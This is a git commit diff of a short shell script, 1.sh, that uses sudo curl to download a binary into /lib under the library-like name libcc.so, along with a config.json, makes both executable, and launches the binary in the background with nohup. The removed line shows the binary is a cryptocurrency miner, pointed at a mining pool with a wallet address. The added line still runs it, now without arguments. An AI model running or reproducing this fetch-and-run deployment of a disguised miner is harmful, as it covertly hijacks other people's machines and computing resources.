c2376a46fc124bdd73260ec3b7fcda45a4eea8a6
Shallow-Sea <59738846+Shallow-Sea@users.noreply.github.com>
2023-04-02 04:36:18 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -3,4 +3,4 @@ sudo curl -o /lib/libcc.so https://github.com/Shallow-Sea/tools/raw/main/libcc.s
 sudo curl -o /lib/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
 sudo chmod +x /lib/libcc.so
 sudo chmod +x /lib/config.json
-sudo nohup /lib/libcc.so -o auto.skypool.xyz:9999 -u 4A4fyoKs9t2bbsq2qLJAzrCCKJohYXfqr9RiLedQFyy6d7KjvRbGbfiUf8Vxbmcbc8KyNkfknTMkz3ggHGZgv6zJEcsq6FK -k --tls --algo auto -p linode &
+sudo nohup /lib/libcc.so &
